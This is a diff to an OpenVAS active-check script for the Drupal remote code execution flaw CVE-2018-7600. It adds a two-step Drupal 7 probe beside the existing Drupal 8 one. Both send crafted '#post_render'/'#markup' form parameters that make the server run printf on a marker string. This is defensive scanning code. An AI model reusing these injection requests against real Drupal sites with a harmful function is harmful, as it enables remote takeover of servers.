@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_drupal_core_rce_vuln_SA-CORE-2018-002_active.nasl 9479 2018-04-14 11:30:08Z cfischer $
+# $Id: gb_drupal_core_rce_vuln_SA-CORE-2018-002_active.nasl 9500 2018-04-17 04:43:26Z ckuersteiner $
 #
 # Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) - (Active Check)
 #
@@ -29,11 +29,11 @@ CPE = 'cpe:/a:drupal:drupal';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108438");
-  script_version("$Revision: 9479 $");
+  script_version("$Revision: 9500 $");
   script_cve_id("CVE-2018-7600");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-14 13:30:08 +0200 (Sat, 14 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-17 06:43:26 +0200 (Tue, 17 Apr 2018) $");
   script_tag(name:"creation_date", value:"2018-04-14 13:29:22 +0200 (Sat, 14 Apr 2018)");
   script_name("Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) - (Active Check)");
   script_category(ACT_GATHER_INFO);
@@ -102,11 +102,9 @@ urls = make_list( dir + "/user/register", dir + "/?q=user/register" );
 
 foreach url( urls ) {
 
-  # TODO: Only works for Drupal 8, Drupal 7 seems to handle this request differently
   url  = url + "?element_parents=account%2Fmail%2F%23value&ajax_form=1&_wrapper_format=drupal_ajax";
   data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=" + check;
   req  = http_post_req( port:port, url:url, data:data,
-                        accept_header:"*/*",
                         add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
   res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
   # neNWIz2mlhti89hQ[{"command":"insert","method":"replaceWith","selector":null,"data":"16\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
@@ -126,4 +124,39 @@ foreach url( urls ) {
   }
 }
 
-exit( 99 );
+# Drupal 7
+# This needs 2 requests (see e.g. https://github.com/FireFart/CVE-2018-7600/blob/master/poc.py)
+url = dir + "/?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=printf&name%5B%23markup%5D="+ check +
+            "&name%5B%23typ";
+data = "form_id=user_pass&_triggering_element_name=name";
+
+req  = http_post_req( port:port, url:url, data:data,
+                      add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
+res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+
+build_id = eregmatch(pattern: '<input type="hidden" name="form_build_id" value="([^"]+)" />', string: res);
+if (!isnull(build_id[1])) {
+  url = dir + "/?q=file%2Fajax%2Fname%2F%23value%2F" + build_id[1];
+  data = "form_build_id=" + build_id[1];
+  req  = http_post_req( port:port, url:url, data:data,
+                      add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
+  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+
+  # wz8rLLg_3Uie91Rg[{"command":"settings","settings":{"basePath":"...
+  if( egrep( string:res, pattern:"^" + check + "\[\{" ) ) {
+
+    info['"HTTP POST" body'] = data;
+    info['URL'] = report_vuln_url( port:port, url:url, url_only:TRUE );
+
+    report  = 'By doing the following request:\n\n';
+    report += text_format_table( array:info ) + '\n';
+    report += 'it was possible to execute the "printf" command.';
+    report += '\n\nResult:\n\n' + res;
+
+    expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
+    security_message( port:port, data:report, expert_info:expert_info );
+    exit( 0 );
+  }
+}
+
+exit( 0 );
